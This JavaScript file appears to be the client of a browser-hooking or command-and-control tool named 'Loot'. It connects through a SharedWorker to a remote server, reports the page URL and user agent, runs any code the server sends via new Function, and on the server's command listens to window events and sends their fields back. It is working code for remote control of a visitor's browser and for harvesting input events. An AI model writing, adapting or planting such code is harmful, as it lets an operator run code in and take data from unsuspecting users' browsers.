"use strict";

export class Loot {
  static #instance;
  #worker;
  #workerPort;
  #userOnMessageHandler = () => { };
  #activeSubscriptions = new Map();

  constructor(url, config = {}) {
    if (Loot.#instance) {
      if (Loot.#instance.config.debug) {
        console.warn("Loot: singleton instance already exists");
      }
      return Loot.#instance;
    }
    this.url = url;
    this.config = { debug: false, ...config };
    try {
      this.#worker = new SharedWorker("sw.js", { type: "module", name: "loot-sw" });
      this.#workerPort = this.#worker.port;
      this.#workerPort.start();
      this.#workerPort.onmessage = (e) => {
        const msg = e.data;
        if (this.config.debug) {
          console.log(`Loot: received message from worker: ${msg}`);
        }
        switch (msg.type) {
          case 'execute':
            try {
              if (this.config.debug) {
                console.log("Loot: executing code from server:", msg.payload);
              }
              new Function(msg.payload)();
            } catch (err) {
              console.error(`Loot: error executing code from server: ${err}`);
            }
            break;
          case 'subscribe':
            this.handleSubscription(msg.payload, true);
            break;
          case 'unsubscribe':
            this.handleSubscription(msg.payload, false);
            break;
        }
        this.#userOnMessageHandler(e);
      };
      this.#workerPort.onmessageerror = (e) => {
        console.error(`Loot: message error from worker: ${e}`);
      };
    } catch (e) {
      console.error(`Loot: failed to initialize shared worker: ${e}`);
      throw new Error("SharedWorker is not supported or enabled in this browser");
    }

    Loot.#instance = this;
  }

  handleSubscription(eventName, shouldSubscribe) {
    if (shouldSubscribe) {
      if (this.#activeSubscriptions.has(eventName)) {
        if (this.config.debug) {
          console.warn(`Loot: already subscribed to event '${eventName}'.`);
        }
        return;
      }
      const handler = (e) => {
        const eventData = {};
        for (const key in e) {
          const value = e[key];
          if (typeof value !== 'object' && typeof value !== 'function') {
            eventData[key] = value;
          }
        }
        this.send({ type: 'event', payload: { eventName, eventData } });
      };
      window.addEventListener(eventName, handler);
      this.#activeSubscriptions.set(eventName, handler);
      if (this.config.debug) {
        console.log(`Loot: subscribed to event '${eventName}'`);
      }
    } else {
      const handler = this.#activeSubscriptions.get(eventName);
      if (handler) {
        window.removeEventListener(eventName, handler);
        this.#activeSubscriptions.delete(eventName);
        if (this.config.debug) {
          console.log(`Loot: unsubscribed from event '${eventName}'`);
        }
      } else if (this.config.debug) {
        console.warn(`Loot: Not subscribed to event '${eventName}'`);
      }
    }
  }

  async connect() {
    return new Promise((resolve, reject) => {
      const originalOnMessage = this.#workerPort.onmessage;
      const originalOnMessageError = this.#workerPort.onmessageerror;
      const cleanup = () => {
        this.#workerPort.onmessage = originalOnMessage;
        this.#workerPort.onmessageerror = originalOnMessageError;
      };
      this.#workerPort.onmessage = (e) => {
        if (e.data.type === "connected") {
          if (this.config.debug) {
            console.log(`Loot: connection to worker established`);
          }
          cleanup();
          resolve();
        } else if (e.data.type === "error") {
          console.error(`Loot: connection error from worker: ${e.data.error}`);
          cleanup();
          reject(new Error(e.data.error));
        } else if (originalOnMessage) {
          originalOnMessage(e);
        }
      };
      this.#workerPort.onmessageerror = (e) => {
        console.error(`Loot: message error during connect: ${e}`);
        cleanup();
        reject(new Error("Shared worker message error during connect"));
      };
      const initPayload = {
        url: window.location.href,
        agent: navigator.userAgent
      };
      this.#workerPort.postMessage({ type: "connect", url: this.url, config: this.config, initPayload });
    });
  }

  shutdown() {
    if (this.#workerPort) {
      this.#workerPort.postMessage({ type: "shutdown" });
      if (this.config.debug) {
        console.log(`Loot: shutdown message sent to worker`);
      }
    } else {
      if (this.config.debug) {
        console.warn(`Loot: not connected to a shared worker`);
      }
    }
  }

  send(data) {
    if (this.#workerPort) {
      this.#workerPort.postMessage({ type: "send", data: JSON.stringify(data) });
    } else {
      console.error("Loot: cannot send data: Shared Worker port not available");
    }
  }

  onMessage(callback) {
    if (typeof callback === 'function') {
      this.#userOnMessageHandler = callback;
    } else if (this.config.debug) {
      console.warn("Loot: onMessage callback must be a function");
    }
  }

  onMessageError(callback) {
    if (this.#workerPort) {
      this.#workerPort.onmessageerror = callback;
    } else if (this.config.debug) {
      console.warn("Loot: worker port not initialized.");
    }
  }
}
